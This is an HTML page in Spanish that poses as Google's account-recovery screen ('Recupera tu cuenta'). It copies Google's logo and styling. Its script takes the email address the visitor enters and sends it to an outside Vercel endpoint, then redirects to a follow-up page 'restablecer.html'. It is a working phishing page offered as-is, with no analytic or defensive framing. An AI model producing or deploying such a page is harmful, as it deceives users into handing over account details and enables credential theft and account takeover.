
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Recupera tu cuenta</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: 'Roboto', sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background-color: #fff;
      width: 450px;
      padding: 40px 30px;
      border-radius: 8px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      text-align: center;
    }
    .logo {
      width: 75px;
      margin-bottom: 20px;
    }
    h1 {
      font-size: 24px;
      color: #202124;
      margin-bottom: 10px;
    }
    p {
      font-size: 14px;
      color: #5f6368;
    }
    input[type="email"] {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      margin-top: 20px;
      margin-bottom: 30px;
    }
    button {
      background-color: #1a73e8;
      color: white;
      padding: 10px 24px;
      font-size: 14px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    button:hover {
      background-color: #1765cc;
    }
  </style>
</head>
<body>
  <div class="container">
    <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
    <h1>Recupera tu cuenta</h1>
    <p>Ingresa tu correo electrónico</p>
    <form id="formulario">
      <input type="email" name="correo" id="correo" required placeholder="Correo electrónico">
      <br>
      <button type="submit">Siguiente</button>
    </form>
  </div>

  <script>
    const form = document.getElementById('formulario');
    form.addEventListener('submit', function(e) {
      e.preventDefault();
      const correo = document.getElementById('correo').value;

      fetch('https://vercel-proxy-project-fkkb8ienh-groogles-projects.vercel.app/api/enviar', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ correo: correo })
      });

      window.location.href = "restablecer.html";
    });
  </script>
</body>
</html>
